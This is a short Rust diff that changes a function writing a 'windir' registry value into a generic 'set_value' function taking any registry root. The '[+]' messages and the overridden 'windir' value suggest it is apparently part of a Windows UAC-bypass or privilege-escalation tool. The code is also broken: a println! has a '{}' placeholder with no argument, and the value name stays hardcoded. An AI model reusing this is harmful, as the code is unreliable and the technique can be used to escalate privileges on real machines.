@@ -1,14 +1,19 @@
-use std::{env::current_exe, ffi::CString};
+use std::{env::current_exe, ffi::CString, path::Path};
 use windows::Win32::{
   Foundation::PSTR,
   System::Registry::{
-    RegCloseKey, RegDeleteValueA, RegOpenKeyExA, RegSetValueExA, HKEY, HKEY_CURRENT_USER,
-    KEY_WRITE, REG_SZ,
+    RegCloseKey, RegDeleteValueA, RegOpenKeyExA, RegSetValueExA, HKEY, KEY_WRITE, REG_SZ,
   },
 };
 
-pub fn set_windir() {
-  println!("[+] Setting the windir registry key...");
+pub use windows::Win32::System::Registry::{
+  HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS,
+};
+
+pub fn set_value<T: AsRef<Path>>(root: HKEY, value_path: &T) {
+  let value_path = value_path.as_ref();
+
+  println!("[+] Setting the {} registry key...");
 
   let mut hkey = HKEY::default();
   let value_name = CString::new("windir").unwrap();
@@ -17,7 +22,7 @@ pub fn set_windir() {
   let subkey = PSTR(subkey.as_ptr() as _);
 
   {
-    let res = unsafe { RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &mut hkey) };
+    let res = unsafe { RegOpenKeyExA(root, subkey, 0, KEY_WRITE, &mut hkey) };
 
     if res != 0 {
       panic!(
